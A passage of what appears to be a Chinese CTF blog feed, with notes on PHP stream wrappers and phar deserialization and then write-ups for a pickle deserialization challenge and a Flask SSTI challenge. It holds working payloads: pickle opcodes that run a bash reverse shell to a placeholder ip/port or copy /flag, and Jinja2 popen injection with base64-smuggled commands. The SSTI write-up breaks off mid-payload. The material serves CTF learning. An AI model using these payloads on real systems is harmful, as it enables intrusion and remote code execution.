php">convert.iconv.&lt;输入编码&gt;.&lt;输出编码&gt;<br>或<br>convert.iconv.&lt;输出编码&gt;/&lt;输入编码&gt;<br></code></pre></td></tr></table></figure><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//将 UTF-8 字符串写入为 GBK 文件</span><br><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;你好，世界！&quot;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/write=convert.iconv.utf-8.gbk/resource=output.txt&#x27;</span>,<br>    <span class="hljs-variable">$text</span><br>);<br></code></pre></td></tr></table></figure><h3 id="链式过滤器"><a href="#链式过滤器" class="headerlink" title="链式过滤器"></a><strong>链式过滤器</strong></h3><p>不同的过滤器可以用管道符连接做一个链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 先解码 Base64，再转换编码（假设原始数据是 GBK 编码的 Base64）</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/read=convert.base64-decode|convert.iconv.gbk.utf-8/resource=data.txt&#x27;</span><br>);<br></code></pre></td></tr></table></figure><h1 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><strong><code>zip://</code></strong></h1><p><strong>用途</strong>：读取 ZIP 压缩包中的文件。</p><p><strong>语法</strong>：<code>zip://&lt;压缩包路径&gt;#&lt;内部文件&gt;</code>。</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;zip://archive.zip#file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="data"><a href="#data" class="headerlink" title="data://"></a><strong><code>data://</code></strong></h1><p><strong>介绍</strong>：数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>allow_url_fopen和allow_url_include都需要开启。</p><p><strong>语法</strong>：<code>data:[&lt;MIME类型&gt;][;base64],&lt;数据&gt;</code>。</p><ul><li><strong>MIME 类型</strong>（可选）：指定数据的格式（如 <code>text/plain</code>, <code>image/png</code>），默认是 <code>text/plain</code>。</li><li><strong>base64</strong>（可选标记）：表示数据是 Base64 编码的。</li><li><strong>数据</strong>：原始内容或 Base64 编码后的内容。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SGVsbG8=&#x27;</span>); <span class="hljs-comment">// 输出 &quot;Hello&quot;</span><br></code></pre></td></tr></table></figure><h1 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><strong><code>phar://</code></strong></h1><p><strong>用途</strong>：访问 PHAR（PHP 归档）文件中的内容。</p><p><strong>语法</strong>：<code>phar://&lt;路径&gt;/file.phar/&lt;内部文件&gt;</code>。</p><p><strong>用法</strong>：在反序列化可以用</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/fb3befe87ee638410501d54bc543c8f3.png" alt="来自CSDN块块"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 创建并配置 PHAR</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br> <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar&#x27;</span>;      <span class="hljs-comment">#phar协议，phar.phar包，</span><br>  <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);     <span class="hljs-comment">#受影响的file_exists函数 触发反序列化</span><br></code></pre></td></tr></table></figure><h1 id="glob"><a href="#glob" class="headerlink" title="glob://"></a><strong><code>glob://</code></strong></h1><p><strong>用途</strong>：匹配文件路径模式（如遍历目录）。一般配合原生类使用</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;glob:///path/*.txt&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123; ... &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.23</title>
    <link href="/tuyi/2025/01/23/2025-1-23/"/>
    <url>/tuyi/2025/01/23/2025-1-23/</url>
    
    <content type="html"><![CDATA[<h1 id="2024-DASCTF-const-python"><a href="#2024-DASCTF-const-python" class="headerlink" title="2024 DASCTF const_python"></a>2024 DASCTF const_python</h1><p>提示访问&#x2F;src拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;buu.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>在ppicklee路由中存在<code>pickle.loads(pickle_data)</code>就存在pickle反序列化</p><p>过滤了很多命令执行函数，但是subprocess没有被过滤，这里可以利用</p><p>payload1反弹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;csubprocess</span><br><span class="hljs-string">    run</span><br><span class="hljs-string">    p0</span><br><span class="hljs-string">    ((lp1</span><br><span class="hljs-string">    Vbash</span><br><span class="hljs-string">    p2</span><br><span class="hljs-string">    aV-c</span><br><span class="hljs-string">    p3</span><br><span class="hljs-string">    aVbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="hljs-string">    p4</span><br><span class="hljs-string">    atp5</span><br><span class="hljs-string">    Rp6.</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>解释</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">csubprocess\nrun：<br><br>c：表示加载模块。<br>subprocess：导入 Python 标准库中的 subprocess 模块。<br>run：引用 subprocess.run 方法。<br>p0 到 p6：<br><br>p0, p1, p2 等是 pickle 的引用标识符，表示序列化对象的内部指针。<br>((lp1：<br><br>创建一个列表对象并开始填充数据。<br>Vbash\np2：序列化字符串 <span class="hljs-string">&quot;bash&quot;</span> 并保存到 p2。<br><br>V-c\np3：序列化字符串 <span class="hljs-string">&quot;-c&quot;</span> 并保存到 p3。<br><br>Vbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\np4：<br><br>序列化的反向 shell 命令，指向 /dev/tcp/ip/port。<br>bash -i：交互式启动 Bash。<br>&gt;&amp; /dev/tcp/ip/port：将标准输出和标准错误重定向到指定的 IP 和端口。<br>0&gt;&amp;1：将标准输入重定向。<br>atp5：<br><br>将上述序列化内容作为参数列表，最终存储到 p5。<br>Rp6.：<br><br>调用 subprocess.run 并执行该命令。<br></code></pre></td></tr></table></figure><p>payload2外带到app.py:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">getattr = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)<br><br><span class="hljs-keyword">open</span> = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>)<br>flag=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><span class="hljs-keyword">read</span>=getattr(flag, <span class="hljs-string">&#x27;read&#x27;</span>)<br>f=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;./app.py&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">write</span>=getattr(f, <span class="hljs-string">&#x27;write&#x27;</span>)<br>fff=<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">write</span>(fff)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>转化为opcode</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">b<span class="hljs-string">&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0cbuiltins</span><br><span class="hljs-string">open</span><br><span class="hljs-string">p1</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>/flag<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;</span><span class="hljs-keyword">read</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>./app.py<span class="hljs-string">&#x27;</span><br><span class="hljs-string">S&#x27;</span>w<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;</span>writ<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">0g3</span><br><span class="hljs-string">(tRp6</span><br><span class="hljs-string">0g5</span><br><span class="hljs-string">(g6</span><br><span class="hljs-string">tR.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>解释：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>getattr<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>：<br><br>c 表示导入模块，这里引用的是 Python 的内置模块 builtins。<br>getattr 用于获取指定对象的属性。<br>cbuiltins<span class="hljs-symbol">\n</span>open<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>：<br><br>open 是 Python 的内置函数，用于打开文件。<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;/flag&#x27;<span class="hljs-symbol">\n</span>tRp2<span class="hljs-symbol">\n</span>：<br><br>g1 引用之前序列化的 open 函数。<br>&#x27;/flag&#x27; 是文件路径，表示尝试打开 /flag 文件。<br>tR 调用 open 方法，返回一个文件对象（保存到 p2）。<br>0g0<span class="hljs-symbol">\n</span>(g2<span class="hljs-symbol">\n</span>S&#x27;read&#x27;<span class="hljs-symbol">\n</span>tRp3<span class="hljs-symbol">\n</span>：<br><br>使用 getattr 获取文件对象（g2 是 /flag 文件）的 read 方法。<br>tR 调用 read 方法，保存读取的内容到 p3。<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;./app.py&#x27;<span class="hljs-symbol">\n</span>S&#x27;w&#x27;<span class="hljs-symbol">\n</span>tRp4<span class="hljs-symbol">\n</span>：<br><br>再次调用 open 函数，这次打开的是 ./app.py 文件，以写入模式 (w) 打开，返回文件对象（保存到 p4）。<br>0g0<span class="hljs-symbol">\n</span>(g4<span class="hljs-symbol">\n</span>S&#x27;write&#x27;<span class="hljs-symbol">\n</span>tRp5<span class="hljs-symbol">\n</span>：<br><br>使用 getattr 获取目标文件对象（p4）的 write 方法。<br>tR 返回 write 方法对象，保存到 p5。<br>0g5<span class="hljs-symbol">\n</span>(g6<span class="hljs-symbol">\n</span>tR.：<br><br>调用 write 方法，将之前读取的 /flag 文件内容写入 ./app.py 文件。<br>功能概述<br>反序列化此数据后，程序将执行以下操作：<br><br>打开 /flag 文件并读取其内容。<br>打开或创建 ./app.py 文件，以写入模式准备写入。<br>将 /flag 文件的内容写入到 ./app.py 文件中。<br></code></pre></td></tr></table></figure><p>自己对于pickle的反序列化和opcode的编写还不是很熟</p><p>还得练</p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.22</title>
    <link href="/tuyi/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/"/>
    <url>/tuyi/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/</url>
    
    <content type="html"><![CDATA[<h1 id="2023愚人杯easy-ssti"><a href="#2023愚人杯easy-ssti" class="headerlink" title="2023愚人杯easy-ssti"></a>2023愚人杯easy-ssti</h1><p>进入F12打开控制台提示下载app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string,render_template<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>,name=name)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hellodear</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ge&quot;</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Nonononon&#x27;</span><br></code></pre></td></tr></table></figure><p>hello目录下有ssti</p><p>payload要有ge或者不能有f</p><p>尝试打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>但是 &#x2F; 被当作路由报错，尝试绕过，使用base64编码<strong>反引号</strong>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> bHMgLw== | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo bHMgLw== | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>最后使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span 